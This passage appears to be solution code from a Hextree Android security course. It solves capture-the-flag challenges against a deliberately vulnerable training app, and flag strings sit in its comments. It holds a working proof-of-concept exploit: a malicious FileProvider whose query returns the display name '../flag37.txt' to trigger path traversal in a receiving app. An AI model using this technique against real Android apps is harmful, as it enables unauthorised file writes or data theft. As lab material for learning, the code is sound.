                    """.trimIndent() + "\n"
                )
            }
            fd.close() //HXT{overwriting-shared-prefs-034nsd}
        }
    }
}
```

```kotlin
// https://app.hextree.io/courses/content-provider/the-androidx-fileprovider/exploit-fileprovider-receivers

// ContentProviderSolver.kt
val flag37Button: Button = findViewById(R.id.flag37Button)
flag37Button.setOnClickListener {
    val bufferedWriter = BufferedWriter(FileWriter(File(filesDir, "give_flag.txt")))
    bufferedWriter.use {
        it.write("give flag")
    }

    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag37Activity"
    )
    intent.setData(Uri.parse(
        "content://com.example.hextreepoc.flag37/other_files/give_flag.txt"
    ))
    intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
    startActivity(intent) //HXT{file-name-query-187xh}
}

// AndroidManifest.xml
<provider
    android:authorities="com.example.hextreepoc.flag37"
    android:name=".Flag37ContentProvider"
    android:exported="false"
    android:grantUriPermissions="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/flag37filepaths"/>
    />
</provider>

// flag37filepaths.xml
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <files-path
        name="other_files"
        path="."/>
</paths>

// Flag37ContentProvider.kt
package com.example.hetreepoc

import android.content.ContentProvider
import android.content.ContentValues
import android.content.Context
import android.database.Cursor
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.net.Uri
import android.provider.BaseColumns
import android.util.Log
import androidx.core.content.FileProvider

private class PoCDbHelper(context: Context?) : SQLiteOpenHelper(context, DATABASE_NAME, null, DATABASE_VERSION) {

    object PocEntry : BaseColumns {
        const val TABLE_NAME = "poc"
        const val DISPLAY_NAME = "_display_name"
        const val SIZE = "_size"
    }
    private val SQL_CREATE_ENTRIES =
        "CREATE TABLE ${PocEntry.TABLE_NAME} (" +
                "${BaseColumns._ID} INTEGER PRIMARY KEY," +
                "${PocEntry.DISPLAY_NAME} TEXT," +
                "${PocEntry.SIZE} INTEGER)"
    private val SQL_DELETE_ENTRIES = "DROP TABLE IF EXISTS ${PocEntry.TABLE_NAME}"

    override fun onCreate(db: SQLiteDatabase) {
        db.execSQL(SQL_CREATE_ENTRIES)

        // Create a new map of values, where column names are the keys
        val values = ContentValues().apply {
            put(PocEntry.DISPLAY_NAME, "../flag37.txt")
            put(PocEntry.SIZE, 1337)
        }
        // Insert the new row, returning the primary key value of the new row
        db.insert(PocEntry.TABLE_NAME, null, values)
    }
    override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        // This database is only a cache for online data, so its upgrade policy is
        // to simply to discard the data and start over
        db.execSQL(SQL_DELETE_ENTRIES)
        onCreate(db)
    }
    override fun onDowngrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        onUpgrade(db, oldVersion, newVersion)
    }

    companion object {
        // If you change the database schema, you must increment the database version.
        const val DATABASE_VERSION = 1
        const val DATABASE_NAME = "Flag37PoC.db"
    }
}

class Flag37ContentProvider : FileProvider() {
    private lateinit var  dbHelper: SQLiteOpenHelper

    override fun onCreate(): Boolean {
        dbHelper = PoCDbHelper(context)
        return true
    }

    override fun query(
        uri: Uri,
        projection: Array<out String>?,
        selection: String?,
        selectionArgs: Array<out String>?,
        sortOrder: String?
    ): Cursor {

        val db = dbHelper.readableDatabase
        val cursor = db.query(
            PoCDbHelper.PocEntry.TABLE_NAME,   // The table to query
            null,             // The array of columns to return (pass null to get all)
            null,              // The columns for the WHERE clause
            null,          // The values for the WHERE clause
            null,                   // don't group the rows
            null,                   // don't filter by row groups
            null               // The sort order
        )
        Log.i(Flag37ContentProvider::class.java.name, Utils.dumpContentProvider(cursor))
        return cursor
    }

    override fun getType(uri: Uri): String? {
        TODO("Not implemented")
    }

    override fun insert(uri: Uri, values: ContentValues?): Uri? {
        TODO("Not implemented")
    }

    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<out String>?): Int {
        TODO("Not implemented")
    }

    override fun update(
        uri: Uri,
        values: ContentValues?,
        selection: String?,
        selectionArgs: Array<out String>?
    ): Int {
        TODO("Not implemented")
    }
}
```
